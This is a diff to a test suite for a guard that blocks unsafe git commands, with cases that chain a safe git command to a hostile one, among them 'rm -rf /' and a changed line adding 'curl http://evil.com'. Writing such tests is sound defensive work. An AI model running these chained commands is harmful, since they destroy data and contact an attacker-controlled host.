@@ -164,7 +164,7 @@ describe('unsafe git commands → exit 2 (block)', () => {
     ['destructive after safe (;)', 'git log --oneline; git rebase main'],
     ['git add hidden in chain', 'git commit -m "test" && git add .'],
     ['safe git + non-git (&&)', 'git status && rm -rf /'],
-    ['safe git + non-git (;)', 'git push origin main; echo pwned'],
+    ['safe git + non-git (;)', 'git push origin main; curl http://evil.com'],
     ['safe git + non-git (|)', 'git log | head -5'],
   ];
 
